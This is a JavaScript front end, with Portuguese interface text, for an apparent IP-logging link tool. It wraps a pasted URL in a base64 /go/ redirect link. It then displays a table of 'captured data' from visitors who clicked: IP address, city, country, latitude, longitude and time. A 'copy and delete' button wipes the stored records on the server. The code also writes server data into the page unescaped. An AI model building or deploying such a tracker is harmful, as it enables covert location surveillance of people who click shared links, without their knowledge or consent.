function generateLink() {
  const input = document.getElementById("url");
  const url = input.value.trim();
  if (!url) return alert("Cole um link válido.");

  const encoded = encodeURIComponent(url);
  const finalLink = `${location.origin}/go/${btoa(encoded)}`;

  const div = document.getElementById("result");
  div.innerHTML = `
    <p>Link gerado:</p>
    <input type="text" id="finalLink" value="${finalLink}" readonly />
    <button onclick="copyAndClear()">Copiar e apagar</button>
  `;
  div.style.display = "block";

  fetchData(); // Atualiza painel abaixo
}

function copyAndClear() {
  const input = document.getElementById("finalLink");
  input.select();
  document.execCommand("copy");

  // Apaga dados do servidor
  fetch("/clear", { method: "POST" });

  document.getElementById("result").style.display = "none";
  document.getElementById("result").innerHTML = "";
  document.getElementById("url").value = "";
  document.getElementById("dataTable").style.display = "none";
}

function fetchData() {
  fetch("/data")
    .then(res => res.json())
    .then(entries => {
      if (!entries.length) return;

      const table = `
        <h2>Dados capturados:</h2>
        <table>
          <tr><th>IP</th><th>Cidade</th><th>País</th><th>Latitude</th><th>Longitude</th><th>Hora</th></tr>
          ${entries.map(e => `
            <tr>
              <td>${e.ip || "-"}</td>
              <td>${e.city || "-"}</td>
              <td>${e.country || "-"}</td>
              <td>${e.latitude || "-"}</td>
              <td>${e.longitude || "-"}</td>
              <td>${new Date(e.timestamp).toLocaleString()}</td>
            </tr>
          `).join("")}
        </table>
      `;
      const div = document.getElementById("dataTable");
      div.innerHTML = table;
      div.style.display = "block";
    });
}

window.onload = fetchData;
